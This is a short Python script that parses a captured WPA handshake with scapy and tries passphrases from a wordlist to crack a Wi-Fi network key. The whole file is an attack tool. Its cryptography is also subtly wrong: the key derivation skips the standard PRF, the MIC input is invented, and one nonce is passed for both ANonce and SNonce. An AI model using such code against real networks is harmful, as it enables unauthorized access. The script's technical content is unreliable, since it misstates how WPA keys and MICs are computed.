import hmac
from hashlib import pbkdf2_hmac
from scapy.all import rdpcap, EAPOL, Dot11, Dot11Beacon

def extract_wpa_details(packet):
    eapol_details = {}
    if packet.haslayer(EAPOL):
        eapol = packet[EAPOL]
        if eapol.type == 3:  # EAPOL-Key
            key_mic = eapol.key_mic
            key_nonce = eapol.key_nonce
            ap_mac = packet[Dot11].addr2
            client_mac = packet[Dot11].addr1
            print(f"WPA Key MIC: {key_mic.hex()}")
            print(f"Key Nonce: {key_nonce.hex()}")
            print(f"AP MAC: {ap_mac}")
            print(f"Client MAC: {client_mac}")
            eapol_details = {
                "key_mic": key_mic,
                "key_nonce": key_nonce,
                "ap_mac": ap_mac,
                "client_mac": client_mac,
            }
    
    if packet.haslayer(Dot11Beacon):
        ssid = packet.info.decode()
        print(f"SSID: {ssid}")
        return ssid, eapol_details
    return None, eapol_details

def derive_ptk(pmk, ap_mac, client_mac, anonce, snonce):
    b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    return hmac.new(pmk, b, digestmod='sha1').digest()[:16]

def crack_wpa_passphrase(wordlist, ssid, ap_mac, client_mac, anonce, snonce, key_mic):
    for passphrase in wordlist:
        pmk = pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
        ptk = derive_ptk(pmk, ap_mac, client_mac, anonce, snonce)
        mic = hmac.new(ptk[:16], b"\x01" + anonce + snonce + ap_mac + client_mac, digestmod='md5').digest()
        
        if mic == key_mic:
            print(f"Passphrase found: {passphrase}")
            return passphrase
    print("Passphrase not found in wordlist.")
    return None

def main():
    pcap_file = "wpa.cap"
    wordlist_file = "pwd.txt"
    
    with open(wordlist_file, 'r') as f:
        wordlist = f.read().splitlines()
    
    packets = rdpcap(pcap_file)
    ssid = None
    eapol_details = None
    
    for pkt in packets:
        if not ssid:
            ssid, details = extract_wpa_details(pkt)
        else:
            _, details = extract_wpa_details(pkt)
        
        if details:
            eapol_details = details
    
    if ssid and eapol_details:
        crack_wpa_passphrase(
            wordlist,
            ssid,
            eapol_details["ap_mac"],
            eapol_details["client_mac"],
            eapol_details["key_nonce"],
            eapol_details["key_nonce"],
            eapol_details["key_mic"]
        )
    else:
        print("Required information not found in pcap file.")

if __name__ == "__main__":
    main()
